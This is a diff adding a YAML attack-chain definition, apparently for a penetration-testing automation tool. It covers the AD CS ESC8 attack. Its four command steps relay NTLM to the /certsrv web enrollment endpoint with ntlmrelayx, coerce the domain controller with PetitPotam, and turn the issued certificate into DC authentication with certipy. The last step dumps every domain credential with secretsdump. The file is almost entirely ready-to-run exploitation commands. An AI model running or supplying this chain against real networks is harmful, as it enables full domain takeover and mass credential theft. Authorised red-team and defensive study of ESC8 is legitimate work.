@@ -1,0 +1,42 @@
+chain_id: adcs_esc8_web_enrollment_relay
+title: "AD CS — ESC8 NTLM relay to /certsrv for DA certificate"
+severity: CRITICAL
+tags: [ad, adcs, esc8, certify, certipy, ntlm-relay, certificates]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/certsrv" }
+    - { kind: "smb-no-signing" }
+
+description: |
+  ESC8: AD CS Web Enrollment endpoint (/certsrv) accepts NTLM auth and
+  doesn't enforce EPA. Combined with any auth-coercion primitive
+  (PetitPotam / PrinterBug / DFS) and any host with smb-no-signing,
+  forward the captured NTLM to /certsrv to mint a DC certificate.
+
+steps:
+  - id: 1
+    title: "Stand up impacket-ntlmrelayx pointed at /certsrv"
+    command: |
+      impacket-ntlmrelayx -t http://$ADCS_HOST/certsrv/certfnsh.asp -smb2support \
+        --adcs --template DomainController
+
+  - id: 2
+    title: "Coerce DC$ to authenticate (PetitPotam → ntlmrelayx)"
+    command: |
+      python3 PetitPotam.py -u low_priv -p 'low_priv_pw' $LISTENER $DC
+
+  - id: 3
+    title: "ntlmrelayx prints the base64 PFX — save and convert"
+    command: |
+      echo 'BASE64_PFX' | base64 -d > dc.pfx
+
+  - id: 4
+    title: "Authenticate as DC$ with the certificate, then DCSync"
+    command: |
+      certipy auth -pfx dc.pfx -dc-ip $DC
+      impacket-secretsdump -k -no-pass -just-dc 'DOMAIN/DC$@DC.DOMAIN.LOCAL'
+
+references:
+  - https://github.com/ly4k/Certipy
+  - https://posts.specterops.io/certified-pre-owned-d95910965cd2
